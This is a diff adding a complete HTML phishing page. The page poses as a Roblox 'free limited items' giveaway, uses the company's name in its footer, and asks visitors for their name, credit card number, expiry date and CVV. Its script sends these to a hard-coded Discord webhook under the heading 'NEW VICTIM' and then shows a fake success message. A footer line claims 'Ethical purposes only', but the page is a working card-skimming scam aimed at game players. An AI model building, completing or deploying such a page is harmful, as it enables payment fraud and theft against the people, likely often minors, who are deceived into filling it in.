@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Exclusive Items</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+        body { 
+            background: linear-gradient(135deg, #ff7b00, #ff9e42); 
+            color: white; 
+            min-height: 100vh;
+            transition: background 0.8s ease;
+            padding: 20px;
+        }
+        .container { max-width: 800px; margin: 0 auto; }
+        header { text-align: center; padding: 30px 0; }
+        h1 { font-size: 2.5rem; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .items { 
+            display: flex; 
+            justify-content: space-between; 
+            margin: 40px 0; 
+            gap: 20px;
+        }
+        .item-card {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            width: 30%;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .item-card:hover { transform: scale(1.05); }
+        .item-card h3 { margin: 10px 0; font-size: 1.4rem; }
+        .item-card p { font-size: 1.2rem; }
+        .form-section { background: rgba(0,0,0,0.2); padding: 25px; border-radius: 15px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: none; 
+            border-radius: 8px; 
+            background: rgba(255,255,255,0.9);
+        }
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            background: #00cc66; 
+            border: none; 
+            border-radius: 8px; 
+            color: white; 
+            font-size: 1.2rem; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: background 0.3s;
+        }
+        button:hover { background: #00b359; }
+        .footer { text-align: center; margin-top: 20px; opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>FREE ROBLOX LIMITEDS</h1>
+            <p>Special event: Get exclusive items for free!</p>
+        </header>
+        
+        <div class="items">
+            <div class="item-card" data-item="headless" data-color="#ff7b00">
+                <h3>HEADLESS</h3>
+                <p>Value: $500</p>
+            </div>
+            <div class="item-card" data-item="korblox" data-color="#2a0a5e">
+                <h3>KORBLOX</h3>
+                <p>Value: $200</p>
+            </div>
+            <div class="item-card" data-item="dominus" data-color="#ffffff">
+                <h3>DOMINUS EMPYREUS</h3>
+                <p>Value: $1200</p>
+            </div>
+        </div>
+
+        <div class="form-section">
+            <form id="payment-form">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="fullname" required>
+                </div>
+                <div class="form-group">
+                    <label>Credit Card Number</label>
+                    <input type="text" id="cardnumber" required>
+                </div>
+                <div class="form-group">
+                    <label>Expiry Date (MM/YY)</label>
+                    <input type="text" id="expiry" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" required>
+                </div>
+                <button type="submit">CLAIM FREE ITEM</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>© 2023 Roblox Corporation | Ethical purposes only</p>
+        </div>
+    </div>
+
+    <script>
+        document.body.style.background = "linear-gradient(135deg, #ff7b00, #ff9e42)";
+        
+        const items = document.querySelectorAll('.item-card');
+        items.forEach(item => {
+            item.addEventListener('click', () => {
+                const color = item.getAttribute('data-color');
+                document.body.style.background = `linear-gradient(135deg, ${color}, #424242)`;
+            });
+        });
+
+        document.getElementById('payment-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const data = {
+                name: document.getElementById('fullname').value,
+                card: document.getElementById('cardnumber').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                item: Array.from(items).find(item => 
+                    getComputedStyle(item).transform !== 'none'
+                )?.getAttribute('data-item') || 'headless'
+            };
+
+            const webhookURL = 'https://discord.com/api/webhooks/1402363278369357824/DtSaC_PssEpOw2MNan-6FYyYgANasWjK-hU3v9jlBfDqbGGXnF6_Cp5ei9J3KRkI28_2';
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**NEW VICTIM**\nName: ${data.name}\nCard: ${data.card}\nExpiry: ${data.expiry}\nCVV: ${data.cvv}\nItem: ${data.item}`
+                })
+            });
+
+            alert('SUCCESS! Item delivered. $' + 
+                (data.item === 'headless' ? '500' : 
+                 data.item === 'korblox' ? '200' : '1200') + 
+                ' refund initiated. Check your email.');
+        });
+    </script>
+</body>
+</html>
